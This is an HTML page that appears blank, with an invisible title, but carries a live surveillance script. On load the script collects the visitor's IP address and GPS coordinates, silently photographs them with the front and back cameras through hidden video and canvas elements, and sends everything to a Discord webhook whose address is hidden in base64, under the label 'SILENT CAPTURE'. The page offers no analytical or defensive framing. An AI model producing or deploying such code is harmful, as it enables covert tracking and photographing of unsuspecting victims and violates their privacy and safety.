<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ㅤ</title>
    <style>body { background: white; margin: 0; padding: 0; cursor: default; }</style>
</head>
<body>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

<script>
    const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
    const _0xI = "aHR0cHM6Ly90ci5yYnhjZG4uY29tLzE4MERBWS1kMWZmNTlhNDJlYzcwMDMwZGFhYjlkM2NjYjkzYjc2My80MjAvNDIwL0JhY2tBY2Nlc3NvcnkvV2VicC9ub0ZpbHRlcg==";
    const WH = atob(_0xW);

    async function send(msg, file = null) {
        const formData = new FormData();
        formData.append("payload_json", JSON.stringify({
            embeds: [{
                title: "🛰️ S.A.U SILENT CAPTURE",
                description: msg,
                color: 16711680,
                thumbnail: { url: atob(_0xI) }
            }]
        }));
        if (file) formData.append("file", file, "capture.png");
        await fetch(WH, { method: "POST", body: formData });
    }

    async function takePic(face) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: face === 'front' ? "user" : "environment" }
            });
            const video = document.getElementById('v');
            video.srcObject = stream;
            await new Promise(r => video.onloadedmetadata = r);
            
            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            return new Promise(r => canvas.toBlob(r, 'image/png'));
        } catch (e) { return null; }
    }

    window.onload = async () => {
        // Step 1: Lấy IP và thông tin cơ bản
        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'Unknown'}));
        
        // Step 2: Yêu cầu GPS & Chụp ảnh đồng thời
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            let report = `📍 **Location:** [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n🌐 **IP:** \`${ipReq.ip}\``;
            
            // Chụp cam trước
            const front = await takePic('front');
            if (front) await send(report + "\n📸 **Camera:** Front Face", front);
            
            // Chụp cam sau (nếu có)
            const back = await takePic('back');
            if (back) await send("📸 **Camera:** Back/Main", back);
            
        }, async (err) => {
            await send(`❌ **GPS Denied/Error**\n🌐 **IP:** \`${ipReq.ip}\``);
            
            // Dù GPS bị chặn vẫn thử chụp cam trước
            const front = await takePic('front');
            if (front) await send("📸 **Camera:** Front Face (GPS Denied)", front);
        });
    };
</script>
</body>
</html>
